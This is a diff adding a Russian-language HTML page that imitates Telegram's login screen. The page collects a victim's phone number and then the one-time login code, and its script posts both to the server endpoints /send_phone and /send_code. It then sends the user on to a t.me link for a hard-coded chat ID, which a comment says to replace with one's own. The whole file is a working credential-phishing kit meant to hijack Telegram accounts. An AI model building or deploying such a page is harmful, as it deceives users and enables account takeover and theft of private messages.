@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Вход</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0088cc;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            background-color: white;
+            color: #0088cc;
+            padding: 40px 30px;
+            border-radius: 15px;
+            width: 350px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .title {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        /* Стили для текста "Telegram" */
+        .logo-text {
+            font-size: 40px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #0088cc;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0088cc;
+            color: white;
+            font-size: 16px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #006c99;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #ccc;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Текст вместо логотипа -->
+<div class="logo-text">Telegram</div>
+
+<div class="container">
+    <div class="title">Вход в Telegram</div>
+
+    <!-- Форма ввода номера -->
+    <form id="phoneForm">
+        <div class="form-group">
+            <input type="tel" id="phone" placeholder="Введите номер телефона" required>
+        </div>
+        <button type="submit">Далее</button>
+    </form>
+
+    <!-- Форма ввода кода -->
+    <form id="codeForm" style="display:none;">
+        <div class="form-group">
+            <input type="text" id="code" placeholder="Введите код" required>
+        </div>
+        <button type="submit">Подтвердить</button>
+    </form>
+
+    <div class="footer">
+        <p>Создать новый аккаунт? <a href="#">Зарегистрироваться</a></p>
+    </div>
+</div>
+
+<script>
+    // Замените на ваш Chat ID
+    const chatId = '7806195587';
+
+    document.getElementById("phoneForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        const phone = document.getElementById("phone").value;
+
+        fetch("/send_phone", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ phone: phone })
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert(data.message);
+            document.getElementById("phoneForm").style.display = "none";
+            document.getElementById("codeForm").style.display = "block";
+        })
+        .catch(error => console.error("Error:", error));
+    });
+
+    document.getElementById("codeForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        const phone = document.getElementById("phone").value;
+        const code = document.getElementById("code").value;
+
+        fetch("/send_code", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ phone: phone, code: code })
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert(data.message);
+            // Перенаправление в Telegram
+            window.location.href = `https://t.me/${chatId}`;
+        })
+        .catch(error => console.error("Error:", error));
+    });
+</script>
+
+</body>
+</html>
